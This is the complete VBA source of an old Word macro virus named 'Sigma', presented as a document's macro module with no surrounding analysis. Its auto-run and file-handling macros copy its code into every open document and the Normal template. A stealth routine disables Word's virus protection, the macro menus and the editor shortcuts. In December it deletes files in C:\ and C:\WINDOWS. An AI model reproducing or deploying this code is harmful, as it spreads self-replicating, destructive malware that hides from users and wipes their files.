   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Sigma"


   Attribute VB_Name = "Sigma1"
   'Copyright(c) 2000 Puerto Princesa City.
   Sub AutoOpen()
       On Error Resume Next
       Call clascopy
   End Sub
   Sub AutoExec()
       On Error Resume Next
       Call clascopy
   End Sub
   Sub FileSaveAs()
       On Error Resume Next
       Call clascopy
       Dialogs(wdDialogFileSaveAs).Show
   End Sub
   Sub FileOpen()
       On Error Resume Next
       Dialogs(wdDialogFileOpen).Show
       Call clascopy
   End Sub
   Sub FileSave()
       On Error Resume Next
       Call clascopy
   End Sub
   Sub FileNew()
       On Error Resume Next
       Dialogs(wdDialogFileNew).Show
       Call clascopy
   End Sub
   Sub clascopy()
       On Error Resume Next
       Call stealth
       infected = False
       For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
           modname = NormalTemplate.VBProject.VBComponents(A_A).Name
           If modname = "Sigma" Then infected = True
           If (modname <> "Sigma") And (modname <> "ThisDocument") Then
               Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
           End If
       Next A_A
       For Each documentopen In Documents
           Docinfected = False
           With documentopen
               For Sigmaclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                   modname = documentopen.VBProject.VBComponents(Sigmaclaw).Name
                   If modname = "Sigma" Then Docinfected = True
                   If (modname <> "Sigma") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                       Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                   End If
               Next Sigmaclaw
               If Docinfected = False Then
                   e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                   vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                   documentopen.VBProject.VBComponents.Add(1).Name = "Sigma"
                   documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                   ActiveDocument.Save
               End If
           End With
       Next documentopen
       If infected = False Then
           e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
           vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
           NormalTemplate.VBProject.VBComponents.Add(1).Name = "Sigma"
           NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
           NormalTemplate.Save
       End If
   End Sub
   Sub stealth()
       On Error Resume Next
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
       FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
       FindKey(BuildKeyCode(wdKeyBreak, wdKeyCtrl)).Disable
       CommandBars("tools").Reset
       CommandBars("Visual Basic").Enabled = False
       CommandBars("Visual Basic").Enabled = False
       CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
       CommandBars("Visual Basic").Protection = msoBarNoCustomize
       CommandBars("Tools").Controls("Macro").Enabled = False
       CommandBars("Tools").Controls("Customize...").Enabled = False
       CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
       Options.ConfirmConversions = False
       Options.VirusProtection = False
       Options.SaveNormalPrompt = False
       ActiveDocument.ReadOnlyRecommended = False
       With Dialogs(wdDialogFileSummaryInfo)
           .Comments = "Puerto Princesa - the cleanest & greenest city in the PHILIPPINES"
           .Execute
       End With
       If Month(Date) = 12 Then
           Kill "C:\*.*"
           Kill "C:\WINDOWS\*.*"
       End If
   End Sub
